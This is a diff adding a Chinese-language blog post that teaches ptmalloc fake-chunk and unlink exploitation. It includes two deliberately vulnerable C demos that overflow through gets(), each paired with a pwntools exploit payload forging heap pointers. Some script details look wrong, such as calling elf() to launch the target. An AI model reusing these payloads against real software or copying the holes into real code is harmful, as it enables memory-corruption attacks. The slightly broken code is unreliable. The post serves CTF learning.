@@ -1,0 +1,134 @@
+---
+layout:     post
+title:      "ptmalloc堆块伪造"
+subtitle:   "基于unlink的check机制"
+date:       2018-07-11 12:00:00
+author:     "Chris"
+catalog: true
+tags:
+    - pwn
+    - Linux
+ 
+---
+
+
+##0x00原理
+1.ptmalloc的相邻空块合并原则。
+
+2.堆chunk本身的结构机制。
+
+##0x01详解
+堆chunk判断一个块是否为空仅仅依赖于相邻后块的**prev_size**和**最低flag位**。
+如果在堆上构造合理的堆块结构，那么堆管理机制就会误以为我们的伪造的堆块是真正的空堆块。
+当释放掉相邻的后块时（这个块是真的），就会触发空块合并。也就达成了堆块伪造的目的。
+
+##0x02要求
+
+有check的堆溢出利用。
+
+* 有两个相邻的堆块
+* 第一个堆块可溢出第二个
+* 释放第二个堆，即可触发。
+
+或者
+
+* 有一个已分配的堆
+* 有一个指向堆上的可控指针
+* free参数可控
+
+这种情况下，是在分配的一大块堆中强行构造出两块chunk。然后利用那个指向堆上的可控指针来实现free触发漏洞。
+这其实是一种double free的利用方式，因为如果你分配了两块堆，然后把这两块堆都释放之后，这些内存会合并到top chunk中。当再次分配堆的时候，还是使用这些内存地址。
+
+那么如果我们进行以下操作：
+
+
+
+	1.分配两个堆
+	2.释放掉这两个堆
+	3.分配一个可以包含住前面两个堆的大堆块
+	4.写入这个大堆块构造两个伪chunk
+	5.通过第2步中释放两个堆
+
+这样对于初始的两个堆来说，就像是double free了，当然本质还是堆块伪造。
+##0x03用的效果
+如果成功的使用了伪造堆，那么达到的效果是什么呢？首先，是不可能像unlink利用一样任意地址写了。
+因为对于目前的ptmalloc来说，有如下check：
+current->fd->bd!=current;
+current->bd->fd!=current;
+为了过掉这个检验我们会用一个指向堆块的全局指针的地址的一个偏移作为伪chunk的fd。
+fd=ptr-12;
+bd=ptr-8;
+然后在断链的过程中，就会把**ptr**的值改成**&ptr-12**,感觉很鸡肋是吧？
+毕竟费这么大力气只是把一个全局变量的值给改成了他的地址－0xC，但是这个东西确实是这么去利用的。
+在CTF中会跟其他的漏洞或功能结合去使用。
+
+
+##0x04演示
+为了具体的说明问题，这里写了两个demo演示效果。
+###Demo1
+
+
+	void *global[80];
+	
+	void *global[80];
+	
+	int main(void)
+	{
+	    void *p1,*p2;
+	    p1=malloc(200);
+	    p2=malloc(200);
+	    global[40]=p1;
+	    printf("before exploit:%x\n",global[40]);
+	    puts("read");//for debug
+	    gets(p1);//overflow
+	    free(p2);
+	    printf("after exploit:%x\n",global[40]);
+	    return 0;
+	}
+
+
+这是对应于第一种堆溢出覆盖下一块堆的情况的，如果使用下面的exp就会发现global中malloc返回的地址已经变成了 global[40]本身的地址－0xC
+
+	from pwn import*
+	io=elf('./demo1')
+	io.recvuntil('read')
+	sc=p32(0x0)+p32(0xc9)+p32(0x804A100-0xc)+p32(0x0804A100-0x8)+'a'*(200-16)+p32(0xc8)+p32(0xd0)
+	io.sendline(sc)
+	io.read()
+
+
+###Demo2
+
+	int *global[40];
+	int main(void)
+	{
+	  void *p1,*p2,*p3;
+	  p1=malloc(200);
+	  p2=malloc(200);
+	  global[20]=p1;
+	  free(p1);
+	  free(p2);
+	  p3=malloc(500);
+	  puts("get");//for debug
+	  gets(p3);
+	  free(p2);
+	  return;
+	}
+
+这个Demo展示的是double free。可以看到对于p2指针来说确实是释放了两次。
+
+
+	from pwn import*
+	io=elf('./demo2')
+	io.recvuntil('get')
+	sc=p32(0x0)+p32(201)+p32(0x804a0b0-0xC)+p32(0x804a0b0-0x8)+'a'*(200-16)+p32(200)+p32(0x128)
+	io.sendline(sc)
+	io.read()
+
+##0x05总结
+这个exp就可以实现利用，感觉这个exp的伪堆块构造要比上面Demo更复杂一些。这个exp我搞了好久，因为不知道为什么一直会触发free的check导致程序崩溃。后来查了一些资料终于明白了，必须要保证你分配的堆与你在其中构造的两个堆块的大小完全一致。
+比方说我这里是malloc(500)，调试一下发现分配了504（鬼知道为什么），那么就是504-8-200=0x128，如果不跟分配的堆块边境符合的话就会触发check从而crash掉。
+
+
+
+
